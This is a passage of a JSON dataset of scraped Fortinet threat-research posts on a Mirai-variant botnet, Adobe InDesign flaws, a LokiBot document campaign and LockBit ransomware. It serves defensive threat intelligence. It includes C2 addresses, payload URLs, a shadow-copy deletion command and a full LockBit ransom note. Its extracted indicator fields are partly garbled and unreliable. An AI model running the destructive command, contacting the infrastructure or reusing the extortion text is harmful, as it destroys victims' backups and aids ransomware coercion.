\"147.182.243.49\" for DNS resolution and establishes communication with the C2 servers.) Figure 8 illustrates the victim's keep-alive message, identified as \"GET / HTTP/1.1\\r\\n\\r\\n\". Once the victim system receives the attack command, it starts a DDoS attack on a specific IP address and port number. One example of this DDoS attack traffic is shown below. This particular botnet, derived from a Mirai variant, features encoded configurations and a collection of XOR keys. It employs an index-based method to decode the data retrieved from the \".rodata\" section. As an illustration, when the index is set to 0, the corresponding key value is 0xCE (calculated as 0x2E ^ 0x0E ^ 0x16 ^ 0xF8), as depicted in Figure 10. After execution, the program prints \"listening tun0\" in the console. It then utilizes the XOR decoding function shown in Figure 11 to obtain the C2 servers. The victim system subsequently sends a hard-coded hex value of 0x17b99063 and appends the victim's public IP address. The captured C2 traffic is displayed in Figures 12 and 13. As mentioned in the initial section, this campaign has demonstrated a pattern of frequent updates within a short timeframe. Our initial discovery of this botnet took place on May 25, 2023. But our analysis identified a similar environment-checking process across different samples. The sample obtained on May 25 did not contain a clear string indicating its C2 domain. However, after June, we observed a change in the domain structure, with the C2 domains now prefixed with \"new.” For the remainder of this section, we will concentrate on the sample collected on June 26 and provide the derived findings. Initially, the botnet verifies whether a specific parameter is present. If the parameter is absent, it assigns the value \"unknown\" and continues with the execution. Next, the botnet retrieves self-information from the \"/proc/self/maps\" file to perform additional checks on the execution path. It ensures that the execution path is not \"/lib\", \"/sbin/\", or \"/usr/\". If the checking fails, the execution is immediately aborted, and the botnet terminates itself. Afterward, the botnet proceeds by generating a random integer using \"time()\" and \"pid()\" for the forked process. The code responsible for this process is presented in Figure 17. Before connecting with the C2 server, the malware initializes all DDoS attack functions. This botnet encompasses a total of 11 methods, namely udpflood, synflood, greflood, ackflood, tcpflood, tcp2flood, udp2flood, socketflood, udpconnflood, wraflood, and vseflood. The initial packet transmitted to the server contains parameters derived from the script file obtained via CVE-2023-28771. This packet is prefixed with \"TCP Connect,\" shown in Figure 19, which provides a detailed representation of this communication. The C2 server issues commands that the botnet handles using a switch case structure, incorporating the following capabilities: By examining the attack method names, we were able to trace back to another sample associated with the C2 domain \"djk38zbdhqpdlshfb[.]shinji[.]app.\" Additionally, we discovered a Telegram group called \"SHINJI. APP | Katana botnet\" that is actively involved in updating the botnet's methods and performing maintenance tasks. The botnet's owner has recently updated its methods, as demonstrated in Figure 20, where the method names align with those found in the MIPS execution file. Targeting vulnerable devices has always been a primary objective for threat actors, and the prevalence of remote code execution attacks poses a major concern for IoT devices and Linux servers. The presence of exposed vulnerabilities in devices can lead to significant risks. Once an attacker gains control over a vulnerable device, they can incorporate it into their botnet, enabling them to execute additional attacks, such as DDoS. To effectively address this threat, it is crucial to prioritize the application of patches and updates whenever possible. Taking proactive measures to ensure the security of these devices is highly recommended. The malware described in this report are detected and blocked by FortiGuard Antivirus as: BAT/Agent. BI!tr.dldrBAT/Agent. CEG!trELF/Mirai. BPD!trELF/Mirai. BQX!trELF/Mirai. AX!trELF/Mirai. CBG!trELF/Mirai. CEG!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address. FortiGuard Labs provides the following IPS signature against attacks exploiting the vulnerability discussed in this report: CVE-2023-28771:Zyxel. Firmware.error.message. Command. Injection For a comprehensive list of protections from FortiGuard Labs for this vulnerability, please visit theOutbreak Alertpage for further details. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. d618c817e6a93193a499126156a1f7e888008dacdb247a769fd69ce4c0c87b67a6729c047d776294fa21956157eec0b50efa7447b8e2834b05be31080767006f729f2fa4d037912a360cb7c4e2c37765da0c38725451600f0258109b672f615e2c55674e938e7618f7c9273e3da61ce7aeab3dc5626b7b8b4e3fc7cc95d0436f928d8ccd71edda5891068d703603ba0b70687f746c9da73afa6692b274ea757c6137a30d8eb932d25664ced747424b15072e676b5d4d27d5b8f3b84f483442170c394849ce4f636cc79cc84389b66a0dbdaf14a61a6d87302e807f2153bc6c2b2fe13ee992cf00778bcc92dc3732305114dca1700dedca7c29342216df236644034cdcb42d1d7b921b4732230bbdcb4089107490a30b8cd7a62e67b657e33d263d69c780fefa0c3a34190989d43268a272004f0623d3e596bc0c92e1744832c979f69993110688372a5898d05f1141b7f44f3f5f55cd50b6a493c1d33af141c8c68211116bbc43c2fe0aba8b598b88b218adc0d995311a4e7030de8acd48076e51becb81d6bdfe79111974c05f2e4a20a8825a872a92df86cbc98517100b031a42b4e116c5d2d3e9d4777c7eaa3c3835a126c02673583c2dfb1ae2bf0bf0db4885d3d93910bfb8410a0e82810d05aa67a6702ce0cdfc38d1d01f2f9471d2015012c65cfd227d393fd338223eb50140571760de04ef0a21fe3c4636e1bfaf4966f82f5ec551f9ac3bb5a3b1ace5dd21c35239bd983fd9a36e0e7c07bfb48a3fdd28fa9225db6d42084123989712313489e255376134f8e77f07b77c345a026304312022da42ab6df882c44d984f9aceea7f08e217a5ca8ca985c533a1af399cee botnets,cve,DDoS attacks FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ddos-botnets-target-zyxel-vulnerability-cve-2023-28771",
      "scraped_at": "2025-07-20T13:55:04.074854",
      "indicators": {
        "ip_address": [
          "147.182.243.49"
        ],
        "domain": [
          "irmware",
          "aw",
          "r"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2023-28771"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.4925775978407557
    }
  },
  {
    "id": "Fortinet_98832",
    "source": "Fortinet",
    "title": "FortiGuard Labs Discovers Multiple Vulnerabilities in Adobe InDesign",
    "text": "FortiGuard Labs Threat Research This past March, I discovered and reported several zero-day vulnerabilities in Adobe InDesign to Adobe. And on Patch Tuesday, July 11, 2023, Adobe released theirsecurity patchesto fix them. The vulnerabilities are identified as CVE-2023-29308, CVE-2023-29309, CVE-2023-29310, CVE-2023-29311, CVE-2023-29312, CVE-2023-29313, CVE-2023-29314, CVE-2023-29315, CVE-2023-29316, CVE-2023-29317, CVE-2023-29318, and CVE-2023-29319. All of these vulnerabilities have been assigned a Critical or Important severity. They also each have different root causes related to a single InDesign plugin. Due to the severity of these vulnerabilities, we suggest that users apply the Adobe patch as soon as possible. Affected platforms:Windows and macOSImpacted parties:Users of Adobe InDesign 2023 version 18.3 and earlier. Users of Adobe InDesign 2022 version 17.4.1 and earlier. Impact:Multiple vulnerabilities leading to memory leaks or arbitrary code execution. Severity level:Critical and Important Following are some details on these vulnerabilities. More information can be found on the related FortinetZero DayAdvisory pages by clicking on the CVE links below: This Arbitrary Code Execution vulnerability exists in decoding QuarkXPressDrawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory write due to an improper bounds check. Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29308. Arbitrary. Code. Execution for this specific vulnerability to proactively protect our customers. This out-of-bounds read vulnerability exists in decoding QuarkXPress Drawing‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29309. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29310. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29311. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29312. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29313. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29314. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29315. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29316. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29317. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29318. Memory. Leak for this specific vulnerability to proactively protect our customers. This Out-of-Bounds Read vulnerability exists in decoding QuarkXPress Drawing ‘QXD’ files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out-of-bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously releasedIPSsignature Adobe. InDesign. CVE-2023-29319. Memory. Leak for this specific vulnerability to proactively protect our customers. Fortinet IPS customers are protected with the following signatures, which were previously released for these vulnerabilities: In addition, FortiEDR detects and prevents the exploitation of these vulnerabilities. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard Security Subscriptions and Servicesportfolio. zero-day vulnerability,adobe,zero-day FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/adobe-indesign-zero-day-vulnerabilities",
      "scraped_at": "2025-07-20T13:55:12.665792",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2023-29309",
          "CVE-2023-29310",
          "CVE-2023-29313",
          "CVE-2023-29314",
          "CVE-2023-29315",
          "CVE-2023-29317",
          "CVE-2023-29318",
          "CVE-2023-29312",
          "CVE-2023-29316",
          "CVE-2023-29319",
          "CVE-2023-29311",
          "CVE-2023-29308"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.9215328467153285
    }
  },
  {
    "id": "Fortinet_68113",
    "source": "Fortinet",
    "title": "LokiBot Campaign Targets Microsoft Office Document Using Vulnerabilities and Macros",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Control and collect sensitive information from a victim’s deviceSeverity level:Critical In a recent FortiGuard Labs investigation, we came across several malicious Microsoft Office documents designed to exploit known vulnerabilities. Specifically, CVE-2021-40444 and CVE-2022-30190 are remote code execution vulnerabilities. Exploiting these vulnerabilities allowed the attackers to embed malicious macros within Microsoft documents that, when executed, dropped the LokiBot malware onto the victim's system. LokiBot, also known as Loki PWS, has been a well-known information-stealing Trojan active since 2015. It primarily targets Windows systems and aims to gather sensitive information from infected machines. In this article, we will delve into the specifics of the identified documents, explore the payload they delivered, and outline the behavioral patterns exhibited by LokiBot. Our analysis aims to shed light on the intricacies of this threat and increase awareness regarding its operational methods. During May 2023, we obtained two types of Word documents for analysis. The first type featured an external link embedded within an XML file, “word/_rels/document.xml.rels,” while the second type included a VBA script that executed a macro immediately upon opening the document. Notably, both files contained a strikingly similar bait image, depicted in Figure 1. The Word document that targets CVE-2021-40444 contained a file “document.xml.rels”, shown in Figure 2, with an external link using MHTML (MIME encapsulation of aggregate HTML documents). This web archive file format combines a website's HTML code and companion resources into a single file. This link also uses Cuttly, a URL shortener and link management platform, to redirect users to the cloud file-sharing website, “GoFile.” Further analysis revealed that a file named “defrt.html” was downloaded upon accessing the link. This file exploits the second vulnerability, CVE-2022-30190. The content of this file and the decoded data is displayed in Figure 3. Upon executing the payload, it initiates the download of an injector file named “oehrjd.exe” from the following URL: http[:]//pcwizard[.]net/yz/ftp/. Detailed information regarding the execution file can be found in the subsequent section. The second document was discovered towards the end of May. Upon analyzing the VBA script embedded within the Word document, as illustrated in Figure 4, the code is automatically executed due to its use of the “Auto_Open” and “Document_Open” functions. Various arrays are decoded within the script and saved to a temporary folder under the name “DD.inf” (Figure 5). It includes a command to create an “ema.tmp” file to store data after line 29 in the “DD.inf” file. The data is then encoded using the “ecodehex” function and saved as “des.jpg”. The script then uses rundll32 to load a DLL file with the function “maintst.” Finally, it deletes all temporary, JPG, and INF files created throughout this process. As mentioned, the VBA script creates an INF file to load a DLL. The purpose of this DLL file, named “des.jpg,” is to download an injector from the URL “https[:]//vertebromed[.]md/temp/dhssdf[.]exe” for use in a later stage. It's worth noting that the download link doesn't belong to a typical file-sharing cloud platform or the attacker's command-and-control (C2) server. Instead, it leverages the website “vertebromed.md,” which has been active since 2018. The injector file, “dhssdf.exe,” was created on May 29, 2023, as shown in Figure 6. Additionally, within the same folder, we discovered another MSIL loader named “IMG_3360_103pdf.exe,” created on May 30, 2023. Although this file isn't directly involved in the Word document attack chain, it also loads LokiBot and connects to the same C2 IP. In this section, we analyze the injector obtained from Follina (SHA256: 9eaf7231579ab0cb65794043affb10ae8e4ad8f79ec108b5302da2f363b77c93). The injector is written in Visual Basic (VB), and we provide an overview of its basic information in Figure 7. Initially, the code extracts individual letters from predetermined strings. These letters are then combined to form an API string, subsequently mapped to the corresponding functions illustrated in Figure 8. The injector utilizes a hardcoded key to decrypt the payload, as shown in Figure 9. The decryption process is outlined in pseudo-code in Figure 10. The decrypted data is decompressed using the “RtlDecompressBufferEx” API and the parameter “COMPRESSION_FORMAT_LZNT1”. The complete procedure through Python code and the partial payload is illustrated in Figure 11. The injector incorporates various evasion techniques, including: After obtaining the payload and verifying the overall environment, the injector utilizes the “VirtualAllocEx” function to allocate memory for the subsequent execution of LokiBot. LokiBot is specifically designed to gather sensitive information from various sources, including web browsers, FTP, email, and numerous software tools installed on the compromised system. Analyzing the C2 traffic to “95[.]164[.]23[.]2/swe/h/pin[.]php” in Figure 13, we determined that the version is 0x0012 and the notable Binary ID is “ckav[.]ru”. As this version of LokiBot has remained unchanged since March, we will only highlight its major components and features. First, the MD5 hash derived from the MachineGuid is in the end pcap, “D0BECCE5760947DD9FFD80DB”. This hash serves as a mutex to ensure that multiple instances of LokiBot are not running simultaneously. It employs the “MoveFileExW” API to create a folder named “%APPDATA%\\Roaming\\576094” and a file named “47DD9F.exe” using a substring of the MD5 from MachineGuid. The file is marked as hidden by the “SetFileAttributes” function and setting the attribute to FILE_ATTRIBUTE_HIDDEN (0x2). The corresponding registry settings associated with LokiBot are depicted in Figure 14. The list of targeted software names is stored in an array, and a partial list is provided in Figure 15. LokiBot is a long-standing and widespread malware active for many years. Its functionalities have matured over time, making it easy for cybercriminals to use it to steal sensitive data from victims. The attackers behind LokiBot continually update their initial access methods, allowing their malware campaign to find more efficient ways to spread and infect systems. LokiBot exploits various vulnerabilities and employs VBA macros to launch its attacks. It also leverages a VB injector to employ several techniques to evade detection or analysis. As a result, it can bypass certain security measures and pose a significant threat to users. To protect themselves, users should exercise caution when dealing with any Office documents or unknown files, especially those that contain links to external websites. It is essential to be vigilant and avoid clicking on suspicious links or opening attachments from untrusted sources. Additionally, keeping the software and operating systems up to date with the latest security patches can help mitigate the risk of exploitation by malware. This malware is detected and blocked by FortiGuard Antivirus as: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the C2 server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. 95[.]164[.]23[.]2 17d95ec93678b0a73e984354f55312dda9e6ae4b57a54e6d57eb59bcbbe3c38223982d2d2501cfe1eb931aa83a4d8dfe922bce06e9c327a9936a54a2c6d409ae9eaf7231579ab0cb65794043affb10ae8e4ad8f79ec108b5302da2f363b77c93da18e6dcefe5e3dac076517ac2ba3fd449b6a768d9ce120fe5fc8d6050e09c552e3e5642106ffbde1596a2335eda84e1c48de0bf4a5872f94ae5ee4f7bffda3980f4803c1ae286005a64ad790ae2d9f7e8294c6e436b7c686bd91257efbaa1e521675edce1fdabfee96407ac2683bcad0064c3117ef14a4333e564be6adf05394a23054c2241e20aec97c9b0937a37f63c30e321be01398977e13228fa980f29 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/lokibot-targets-microsoft-office-document-using-vulnerabilities-and-macros",
      "scraped_at": "2025-07-20T13:55:19.149204",
      "indicators": {
        "ip_address": [],
        "domain": [
          "7DD9F",
          "es",
          "ertebromed",
          "hssdf",
          "ocument",
          "ma",
          "efrt",
          "D",
          "ehrjd"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "9eaf7231579ab0cb65794043affb10ae8e4ad8f79ec108b5302da2f363b77c93"
        ],
        "cve": [
          "CVE-2021-40444",
          "CVE-2022-30190"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.3706823925863522
    }
  },
  {
    "id": "Fortinet_98180",
    "source": "Fortinet",
    "title": "Meet LockBit: The Most Prevalent Ransomware in 2022",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft Windows, Linux, ESXi, MacOSImpacted parties:Microsoft Windows, Linux, ESXi, and MacOS UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High On June 14th, 2023, the CISA, FBI, MS-ISAC, and multiple international cyber security organizationsreleaseda joint advisory for the LockBit ransomware. This ransomware group has been active since early 2020, targeting organizations across numerous industries, including energy and government sectors. According to the advisory, LockBit was the most active ransomware in 2022. This blog provides insights into the LockBit Group's activities over the past few years. LockBit is a ransomware group that has been active since early 2020 (the active period goes back to 2019 if its predecessor “ABCD ransomware” is included in the “LockBit” family) providing a Ransomware-as-a-Service (RaaS) service to for-hire online criminals known as affiliates. The affiliates’ job is to select and infiltrate victim organizations and deploy the ransomware provided by the LockBit developer. The developer has consistently worked to improve the ransomware: LockBit 2.0 (also known as LockBit Red) was released in mid-2021, and LockBit 3.0 (also known as LockBit Black) became available in early-2022. The latest LockBit ransomware variant, “LockBit Green,” appeared in early 2023. While the LockBit ransomware initially only supported the Windows platform, the LockBit threat actor group added support for Linux/VMware/ESXi and macOS platforms in 2021 and 2023, respectively. The group also works with partners who want to sell exfiltrated data but do not want to encrypt victims' files. LockBit uses a dual extortion tactic, demanding that victims pay a ransom to recover their files and not release the stolen information to the public. LockBit is also believed to threaten Distributed Denial of Service (DDoS) attacks against victims if the demanded ransom is not paid. Due to its prevalence and popularity among cybercriminals, FortiGuard Labs has published several blogs and threat signals for LockBit ransomware: Threat Signal As a RaaS, the LockBit operator offers its affiliates a variety of options for splitting the ransom fee. The ransom payment is typically split 1:4 between the LockBit operator and the affiliates. Using the features provided by the LockBit operator, its affiliates can perform a variety of activities, including: It also has “do not target” and approved “target” industry lists for file encryption and data exfiltration. Data gathered through Fortinet’s FortiRecon service supports the CISA advisory's claim that LockBit was the most active ransomware in 2022. According to our internal research, LockBit ransomware accounted for approximately 50% of the 3,298 ransomware incidents we observed in 2022. LockBit ransomware victim organizations are spread across several industries. As explained, the LockBit operator imposes \"do not attack\" rules for specific industries and countries. However, it's up to each affiliate to follow the rules. ABCD ransomware, which first appeared in September 2019, is believed to be the predecessor of LockBit ransomware. Unlike its slightly more sophisticated successor, ABCD ransomware only allows victims to contact it using email. The ransomware also deletes shadow copies by running the commandvssadmin delete shadows /all /quiet & wmic shadowcopy delete, making it difficult to recover files. FortiGuard Labs found what appears to be an even earlier version of the ABCD ransomware (SHA2: 49c0acf512146620dd26f515804324c8e4b4cc8eb8b9ab5d9c57e201241bc7ae). While this variant encrypts files, its ransom note only contains the victim's personal ID. The transition can be seen in a subsequent ABCD ransomware sample (SHA2: c8205792fbc0a5efc6b8f0f2257514990bfaa987768c4839d413dd10721e8871). This sample drops a ransom note, “Restore-My-Files.txt,” and changes the desktop wallpaper. Both refer to LockBit, but encrypted files still have a \".abcd\" extension. It's also worth noting that the LockBit operator set up a data leak site on TOR. ABCD ransomware was rebranded as LockBit in January 2020. This new LockBit variant changes the file extensions of encrypted files to \".lockbit\" instead of \".abcd\". It drops a ransom note with the same name as the ABCD ransomware, and communication was centralized on the TOR website rather than via email. This LockBit variant also replaces the desktop wallpaper on compromised machines to indicate the presence of the ransom note. The threat actor appears to have been using two different wallpapers. LockBit ransomware was updated to LockBit 2.0 (also known as LockBit Red) in mid-2021. This new variant still appends a \".lockbit\" extension to the files it encrypts but now uses a red file icon that mimics the shape of a B. LockBit 2.0 displays a ransom note on the desktop and a text file called Restore-My-Files.txt. This time, the LockBit threat actor added an alternate website that can be accessed through regular web browsers. In October 2021, the LockBit developer released a new LockBit ransomware variant designed to work on Linux and ESXi virtual machines. Like the Windows version, this new LockBit variant encrypts files on compromised devices and leaves a ransom note called \"restore-my-files.txt.\" LockBit 3.0 was released in March 2022. This variant appends a random 9-character file extension instead of the \".lockbit\" extension used by the two previous LockBit variants. It also changes the file icon of the encrypted files to a black file icon that mimics the shape of a B. LockBit 3.0 drops a ransom note labeled \"[random nine letters]_README_txt.\" The threat actor also set up more mirror TOR and regular websites in case they become inaccessible. This turned out to be the right move, as in mid-2022, reported distributed denial-of-service (DDoS) attacks took down LockBit's leak sites. The group also added 'Tox' and 'Jabber' as alternative communication methods for victims. Another noteworthy addition was an advertisement for victims, in which the LockBit group seeks insiders willing to provide internal information and access to the corporate network. It also replaces the desktop wallpaper with a reference to the dropped ransom note. The latest LockBit ransomware variant, \"LockBit Green,\" appeared in January 2023. A random 8-character extension is now added to the LockBit Green extension, and LockBit Green leaves a ransom note titled, \"!!!-Restore-My-Files-!!!.txt\". This new variant also contains a new encryption tool based on the leaked Conti source code. The comprehensive LockBit Green ransom note is reproduced below, as the ransom note dropped by the ransomware is badly formatted. ~~~ LockBit 3.0 the world’s fastest and most stable ransomware from 2019~~~ >>>>> Your data is stolen and encrypted. If you don’t pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don’t hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe. Tor Browser Links:hxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onion Links for normal browser: hxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitap[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.ly >>>>> What guarantee is there that we won’t cheat you? We are the oldest ransomware affiliate program on the planet, nothing is more important than our reputation. We are not a politically motivated group and we want nothing more than money. If you pay, we will provide you with decryption software and destroy the stolen data. After you pay the ransom, you will quickly make even more money. Treat this situation simply as a paid training for your system administrators, because it is due to your corporate network not being properly configured that we were able to attack you. Our pentest services should be paid just like you pay the salaries of your system administrators. Get over it and pay for it. If we don’t give you a decryptor or delete your data after you pay, no one will pay us in the future. You can get more information about us on Ilon Musk’s Twitter hxxps://twitter[.]com/hashtag/[redacted]?f=live >>>>> You need to contact us and decrypt one file for free on TOR darknet sites with your personal ID Download and install Tor Browser hxxps://www.torproject[.]org/ Write to the chat room and wait for an answer, we’ll guarantee a response from you. If you need a unique ID for correspondence with us that no one will know about, tell it in the chat, we will generate a secret chat for you and give you his ID via private one-time memos service, no one can find out this ID but you. Sometimes you will have to wait some time for our reply, this is because we have a lot of work and we attack hundreds of companies around the world. Tor Browser personal link available only to you (available during a ddos attack):hxxp://lockbitsup[redacted][.]onion Tor Browser Links for chat (sometimes unavailable due to ddos attacks): hxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsupt[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onion >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> >>>>> Your personal ID: [redacted] <<<<< >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> >>>>> Warning! Do not delete or modify encrypted files, it will lead to problems with decryption of files! >>>>> Don’t go to the police or the FBI for help and don’t tell anyone that we attacked you. They won’t help and will only make things worse for you. In 3 years not a single member of our group has been caught by the police, we are top notch hackers and we never leave a trail of crime. The police will try to prohibit you from paying the ransom in any way. The first thing they will tell you is that there is no guarantee to decrypt your files and remove stolen files, this is not true, we can do a test decryption before paying and your data will be guaranteed to be removed because it is a matter of our reputation, we make hundreds of millions of dollars and are not going to lose our revenue because of your files. It is very beneficial for the police and FBI to let everyone on the planet know about your data leak because then your state will get the fines budgeted for you due to GDPR and other similar laws. The fines will be used to fund the police and the FBI, they will eat more sweet coffee donuts and get fatter and fatter. The police and the FBI don’t care what losses you suffer as a result of our attack, and we will help you get rid of all your problems for a modest sum of money. Along with this you should know that it is not necessarily your company that has to pay the ransom and not necessarily from your bank account, it can be done by an unidentified person, such as any philanthropist who loves your company, for example, Elon Musk, so the police will not do anything to you if someone pays the ransom for you. If you’re worried that someone will trace your bank transfers, you can easily buy cryptocurrency for cash, thus leaving no digital trail that someone from your company paid our ransom. The police and FBI will not be able to stop lawsuits from your customers for leaking personal and private information. The police and FBI will not protect you from repeated attacks. Paying the ransom to us is much cheaper and more profitable than paying fines and legal fees. >>>>> What are the dangers of leaking your company’s data. First of all, you will receive fines from the government such as the GDRP and many others, you can be sued by customers of your firm for leaking information that was confidential. Your leaked data will be used by all the hackers on the planet for various unpleasant things. For example, social engineering, your employees’ personal data can be used to re-infiltrate your company. Bank details and passports can be used to create bank accounts and online wallets through which criminal money will be laundered. On another vacation trip, you will have to explain to the FBI where you got millions of dollars worth of stolen cryptocurrency transferred through your accounts on cryptocurrency exchanges. Your personal information could be used to make loans or buy appliances. You would later have to prove in court that it wasn’t you who took out the loan and pay off someone else’s loan. Your competitors may use the stolen information to steal technology or to improve their processes, your working methods, suppliers, investors, sponsors, employees, it will all be in the public domain. You won’t be happy if your competitors lure your employees to other firms offering better wages, will you? Your competitors will use your information against you. For example, look for tax violations in the financial documents 